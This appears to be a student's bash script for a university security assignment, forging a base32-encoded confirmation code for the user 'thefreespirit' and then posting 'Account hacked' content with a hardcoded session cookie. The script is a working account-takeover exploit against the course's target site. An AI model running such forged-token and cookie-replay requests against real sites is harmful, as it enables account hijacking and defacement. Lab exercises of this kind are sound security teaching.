#!/bin/bash

if [ $# -ne 1 ]
then
echo "Usage: $0 <url>"
exit 1
fi


# Q2.a
base32_encode() {
  echo -n "$1" | base32
}

user="thefreespirit"
encoded_user=$(base32_encode "$user")
echo "$encoded_user"

# Q2.b
response1=$(curl -i "$1/confirm.php?code=$encoded_user" \
-H 'Cookie: _ga=GA1.2.491559635.1677012521; _gcl_au=1.1.1170839619.1677012521; CS458=mk2inaq85r7j785amlpfb34174' )

# Q2.c
response2=$(curl -i "$1/post.php" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: _ga=GA1.2.491559635.1677012521; _gcl_au=1.1.1170839619.1677012521; CS458=mk2inaq85r7j785amlpfb34174' \
--data-raw 'title=Account+hacked&content=Account+hacked&type=1&form=content&submit=')

echo "$response1"$'\n\n'"$response2" > response.txt
echo "$response1"$'\n\n'"$response2"